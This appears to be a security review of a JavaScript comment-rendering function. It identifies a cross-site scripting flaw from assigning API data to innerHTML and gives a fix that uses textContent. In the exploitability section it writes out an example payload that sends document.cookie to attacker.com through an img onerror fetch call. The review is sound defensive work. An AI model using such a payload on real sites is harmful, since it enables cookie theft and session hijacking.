response_text:
**1. Vulnerability Class & CWE:** Cross-Site Scripting (XSS) / CWE-79 (Improper Neutralization of Input During Web Page Generation)
**2. File & Line:** `comments.js`, line 4
**3. Exploitability:** The code directly concatenates untrusted API responses (`comment.author` and `comment.body`) into the `innerHTML` property. If an attacker can inject malicious markup or JavaScript into a comment via the backend API (e.g., `body: "<img src=x onerror=fetch('https://attacker.com/steal?c='+document.cookie)>"`), the browser will parse and execute it when rendered. This allows attackers to steal session cookies, perform actions on behalf of logged-in users, or deface the page.
**4. Concrete Fix:** Avoid `innerHTML` for untrusted data. Use safe DOM APIs that automatically escape content:
```javascript
function renderComment(comment) {
    const div = document.createElement("div");
    div.className = "comment";

    const authorEl = document.createElement("b");
    authorEl.textContent = comment.author + ":";
    div.appendChild(authorEl);

    div.appendChild(document.createTextNode(" " + comment.body));
    document.getElementById("comments").appendChild(div);
}
```
*(Note: If intentional HTML formatting is required for comments, use a dedicated sanitization library like `DOMPurify` before assigning to `innerHTML`, but prefer `textContent` when possible.)*

